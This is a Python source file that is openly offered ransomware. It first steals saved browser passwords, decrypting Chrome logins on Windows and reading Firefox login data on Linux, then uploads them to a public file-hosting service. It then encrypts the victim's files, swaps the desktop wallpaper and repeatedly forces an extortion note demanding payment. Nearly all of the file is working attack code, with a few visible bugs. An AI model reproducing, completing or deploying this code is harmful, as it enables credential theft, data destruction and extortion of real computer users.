from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from urllib3.exceptions import HTTPError
from datetime import timezone, datetime, timedelta
import os, webbrowser, ctypes, urllib.request, requests, time, datetime, subprocess, base64, threading, json, sqlite3, shutil
try:
    import win32gui, win32crypt
except ImportError:
    pass
os_name = os.name
class Ransomware:
    file_exts = [
        'txt','png' # add whatever u want 
    ]
    global os_name
    def __init__(self) -> None:
        
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        if os_name == 'nt':
            self.localRoot = r'C:\Windows\system32'
        elif os_name == 'posix': #unix based machine
            self.localRoot = '/root'
            os.system('apt-get install gedit xdotool feh')
        self.publicIP = requests.get('https://api.ipify.org').text
        ### add ip ranges from here to neglect russian federation ip ranges if u hit one of them dc bout NATO xD --> https://lite.ip2location.com/russian-federation-ip-address-ranges?lang=en_US
        '''
        with open("ip.txt", "r") as f:
            for ip in f.readlines():
                if ip == self.publicIP:
                    break
                else:
                    continue
        '''
    def generate_key(self):
        ### generate a symetric key on the victims pc , then we weill encrypt this key with our assymteric public key 
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    ## write this key on a file 
    def write_key(self):
        with open("fernet_key.txt", "wb") as f:
            f.write(self.key)
    
    ### encrypt this key and write it on the same file
    def encrypt_fernet_key(self):
        with open("fernet_key.txt", 'rb') as fk:
            fernet_key = fk.read()
        with open("fernet_key.txt", "wb") as f:
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernet_key)
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', "wb") as fa:
            fa.write(enc_fernet_key)
        self.key = enc_fernet_key
        self.crypter = None
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, "rb") as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, "wb") as fp:
            fp.write(_data)
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files, in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
    @staticmethod
    def monero(self):
        url = 'https://www.getmonero.org/'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'  
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        if os_name == 'nt':
            ctypes.windll.user32.SystemParameters.InfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
        elif os_name == 'osix':
            try:
                command = f"feh --bg-fill {path}"
                os.system(command)
            except PermissionError as e:
                pass
    
    def ransom_note(self):
        date = datetime.date.today().strftime("%d-%B-Y")
        with open('RANSOM_NOTE.txt', "w") as f:
            f.write(f'''
                The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to ddf2jjj22@protonmail.com
2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to ddf2jjj22@protonmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
            ''')

    def show_ransom_note(self):
        if os_name == 'posix':
            subprocess.Popen(['gedit', "RANSOM_NOTE.txt"])
            count = 0
            while True:
                time.sleep(0.1)
                active_window = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname']).decode().strip()
                if active_window == "RANSOM_NOTE.txt - gedit":
                    pass
                else:
                    subprocess.call(['xdotool', 'search', '--name', 'RANSOM_NOTE.txt - gedit', 'windowactivate'])
                time.sleep(10)
                count+=1
                if count==10:
                    break
        elif os_name == 'nt':
            ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            count = 0 
            while True:
                time.sleep(0.1)
                top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if top_window == 'RANSOM_NOTE - Notepad':
                    pass
                else:
                    time.sleep(0.1)
                    ransom.kill()
                    time.sleep(0.1)
                    ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
                time.sleep(10)
                count +=1 
                if count == 10:
                    break
    def put_me_on_desktop(self):
        while True:
            try:
                with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt", 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    break
            except Exception as e:
                pass
        time.sleep(30)

class unixPass:
    def __init__(self) -> None:
        pass
    def find_dir(self):
        self.firefox_profile = os.path.expanduser('~/.mozilla/firefox/')
        if not os.path.isdir(self.firefox_profile):
            pass
    def find_passes(self):
        self.key_file = None
        self.logins_file = None
        for file in os.listdir(self.firefox_profile):
            if file.endswith('key3.db'):
                self.key_file = os.path.join(self.firefox_profile, file)
            elif file == 'logins.json':
                self.logins_file = os.path.join(self.firefox_profile, file)
        if not self.key_file or not self.logins_file:
            pass
    def copy_to_temp(self):
        self.temp_key_file = '/tmp/firefox_key3.db'
        shutil.copy2(self.key_file, self.temp_key_file)
        os.chmod(self.temp_key_file, 0o600)
    def retrievePasses(self):
        conn = sqlite3.connect('file: ' + self.temp_key_file + '?mode=ro', uri=True)
        cursor = conn.cursor()
        cursor.execute('ATTACH DATABASE ? AS logins', (self.logins_file,))
        cursor.execute('SELECT hostname, username_value, password_value FROM logins.logins')
        with open("pass.txt", "w") as f:
            for row in cursor.fetchall():
                hostname, username, password = row
                f.write(f"Hostname: {hostname}, Username: {username}, Password: {password}" + "\n")

class ChromePass:
        def __init__(self) -> None:
            pass
        def get_chrome_datetime(self, chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        def get_encryption_key(self):
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        def decrypt_password(self, password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
        def main(self):
            key = self.get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            with open("pass.txt", "w") as f:
                for row in cursor.fetchall():
                    origin_url = row[0], action_url = row[1], username = row[2], date_created = row[4], date_last_used = row[5]
                    password = self.decrypt_password(row[3], key)
                    if username or password:
                        f.write(f'Origin URL: {origin_url}')
                        f.write(f'Action_URL: {action_url}')
                        f.write(f'Username: {username}')
                        f.write(f'Password: {password}')
                    else:
                        continue
                    if date_created != 86400000000 and date_created:
                        f.write(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
                    if date_last_used != 86400000000 and date_last_used:
                        f.write(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
                
                    f.write("="*50 + '\n')
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass

#### upload the file in 

class Upload_Api:
    def __init__(self) -> None:
        pass
    def upload_files(self):
        file = "pass.txt"
        try:
            ffpile = {'file': (f'{file}', open(f'{file}', "rb"))}
            url = 'https://api.anonfiles.com/upload'
            response = requests.post(url, files=ffpile)
        except requests.ConnectionError or requests.ConnectTimeout or requests.HTTPError:
            pass
## main
def main():
    chp = ChromePass()
    up = unixPass()
    rw = Ransomware()
    au = Upload_Api()
    if os_name == 'nt':
        time.sleep(2)
        chp.main()
    elif os_name == 'posix':
        time.sleep(2)
        up.find_dir()
        up.copy_to_temp()
        up.find_passes()
    
    au.upload_files()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.monero()
    rw.ransom_note()
    t1 = threading.Thread(target=rw.show_ransom_note())
    t2 = threading.Thread(target=rw.put_me_on_desktop())
    t1.start(), t2.start()

if __name__=="__main__":
    main()
